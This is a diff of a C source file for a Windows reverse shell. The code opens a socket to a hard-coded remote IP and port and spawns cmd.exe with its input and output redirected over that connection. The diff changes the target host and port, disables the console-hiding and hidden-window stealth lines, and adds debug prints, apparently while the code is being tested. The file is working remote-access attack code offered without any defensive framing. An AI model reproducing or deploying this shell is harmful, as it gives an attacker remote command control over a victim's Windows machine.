@@ -6,12 +6,13 @@
 
 #pragma comment(lib, "Ws2_32.lib")
 
-#define REMOTE_ADDR "192.168.1.2"
-#define REMOTE_PORT "443"
+#define REMOTE_ADDR "192.168.224.1"
+#define REMOTE_PORT "9999"
 
 int main(int argc, char* argv[])
 {
-	FreeConsole();
+	//FreeConsole();
+	//__debugbreak();
 	WSADATA wsaData;
 	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	struct addrinfo* result = NULL, * ptr = NULL, hints;
@@ -28,13 +29,15 @@ int main(int argc, char* argv[])
 	ZeroMemory(&si, sizeof(si));
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));
-	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-	si.wShowWindow = SW_HIDE;
+	si.dwFlags = STARTF_USESTDHANDLES;
+	//si.wShowWindow = SW_HIDE;
+	printf("salut");
 	si.hStdInput = (HANDLE)ConnectSocket;
 	si.hStdOutput = (HANDLE)ConnectSocket;
 	si.hStdError = (HANDLE)ConnectSocket;
 	TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
-	CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+	bool res = CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+	printf("res: %d\n", res);
 	WaitForSingleObject(pi.hProcess, INFINITE);
 	CloseHandle(pi.hProcess);
 	CloseHandle(pi.hThread);
